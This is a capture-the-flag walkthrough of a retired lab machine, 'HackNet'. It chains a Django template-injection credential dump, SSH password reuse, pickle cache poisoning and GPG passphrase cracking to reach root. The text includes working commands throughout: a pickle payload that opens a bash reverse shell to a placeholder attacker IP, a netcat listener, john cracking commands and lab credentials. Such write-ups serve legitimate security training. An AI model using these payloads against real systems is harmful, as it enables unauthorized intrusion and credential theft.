# HackNet

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--09--13-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | September 13, 2025 |
| **Rating** | 3.8 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A Django social app renders a user's display name through a template, so setting the display name to `{{users.values}}` and viewing a page that renders it dumps every user's credentials — a server-side template injection used purely as an information leak. Reaching the target user's record requires a second account and a contact request to see a private profile. The recovered password is reused for SSH. Lateral movement abuses Django's file-based cache, which is pickle-backed and writable: poisoning the cache files gives code execution as `sandy`. Root comes from a GPG private key whose passphrase cracks with rockyou, decrypting a database backup that contains the root password in plaintext chat messages.

---

## Attack Chain Overview

```
SSTI → credential dump → SSH (mikey) → Django cache poisoning → sandy shell
  → GPG key crack → root password from backup → root
```

## Step 1: Setup

```bash
echo "<TARGET_IP> hacknet.htb" | sudo tee -a /etc/hosts
```

## Step 2: SSTI Credential Dump

### Register an account

Register a new account at `http://hacknet.htb` (any email and password).

### Set the SSTI payload as your display name

Go to **Profile → Edit Profile** and change the display name to:

```
{{users.values}}
```

### Dump credentials

Go to **Explore** and like any post, then visit `http://hacknet.htb/likes/<post_id>` and view the page source. All user credentials are dumped into the HTML — the display name is rendered as a template expression, so `users.values` is evaluated server-side.

### Reach `backdoor_bandit`

The target user `backdoor_bandit` (system user `mikey`) has only liked a post on **deepdive**'s private profile, so that post has to be made visible first:

1. Find `deepdive`'s credentials in a public post dump:
   - Email: `deepdive@hacknet.htb`
   - Password: `D33pD!v3r`
2. Log out, log in as **deepdive**
3. Go to **Contacts** and accept the contact request from your test account (send one from the test account first if none exists)
4. Log back in as the test account — the one whose display name is the SSTI payload
5. Visit deepdive's profile and like **post 23**
6. Load `http://hacknet.htb/likes/23` and view the source

That yields:

- Username: `backdoor_bandit` (real name `mikey`)
- Email: `mikey@hacknet.htb`
- Password: `mYd4rks1dEisH3re`

## Step 3: Initial Foothold (User Flag)

```bash
ssh mikey@hacknet.htb
# Password: mYd4rks1dEisH3re

cat ~/user.txt
```

The web application password is reused for SSH.

## Step 4: Lateral Movement (mikey → sandy)

### Django cache deserialization

Django's file-based cache at `/var/tmp/django_cache` is writable and owned by `sandy`. Django serialises cache entries with `pickle`, so a poisoned cache file is arbitrary code execution as whoever reads it.

### Create the pickle payload

```python
# On the target as mikey
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'",),)

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

### Start a listener

```bash
nc -lvnp 4444
```

### Poison the cache files

```bash
# On the target as mikey
cd /var/tmp/django_cache

# If empty, browse to http://hacknet.htb/explore first to populate it
ls *.djcache

# Replace all cache files with the payload
for i in $(ls *.djcache); do
  rm -f $i
  echo '<BASE64_PAYLOAD>' | base64 -d > $i
  chmod 777 $i
done
```

### Trigger

Browse to `http://hacknet.htb/explore` — the cache read deserialises the payload and the listener receives a shell as **sandy**.

## Step 5: Privilege Escalation (sandy → root)

### Get the GPG private key

```bash
cat ~/.gnupg/private-keys-v1.d/armored_key.asc
```

### Crack the passphrase

```bash
gpg2john armored_key.asc > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Result: sweetheart
```

### Decrypt the backup files

```bash
# On the sandy shell
cd /var/www/HackNet/backups/

gpg --import ~/.gnupg/private-keys-v1.d/armored_key.asc

gpg --batch --passphrase 'sweetheart' --pinentry-mode loopback \
  --decrypt backup02.sql.gpg 2>/dev/null | grep -i password
```

The decrypted database backup contains chat messages in which a user shares the root password in plaintext: `h4ck3rs4re3veRywh3re99`.

### Switch to root

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
su root
# Password: h4ck3rs4re3veRywh3re99

cat /root/root.txt
```

## Credentials Summary

| User | Email | Password | Access |
|------|-------|----------|--------|
| deepdive | deepdive@hacknet.htb | `D33pD!v3r` | Web app |
| backdoor_bandit | mikey@hacknet.htb | `mYd4rks1dEisH3re` | SSH (mikey) |
| sandy | — | — | via Django cache RCE |
| sandy's GPG key | — | `sweetheart` | GPG passphrase |
| root | — | `h4ck3rs4re3veRywh3re99` | `su root` |

## Key Vulnerabilities

1. **Server-side template injection** — the username field is rendered in Django templates without sanitisation. Used here for data exposure rather than RCE.
2. **Credential reuse** — the web app password works for SSH.
3. **Insecure cache permissions** — the Django cache directory is writable by a lower-privileged user.
4. **Pickle deserialization** — Django's file-based cache uses `pickle`, so write access to the cache is code execution as the reader.
5. **Weak GPG passphrase** — crackable with rockyou.
6. **Sensitive data in backups** — the root password sits in plaintext inside an encrypted-at-rest database backup.

## Tools Used

nmap, a browser, netcat, `gpg2john`, `john`.

## References

- [Django cache deserialization](https://github.com/Spix0r/django-rce-exploit)
- [SSTI payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
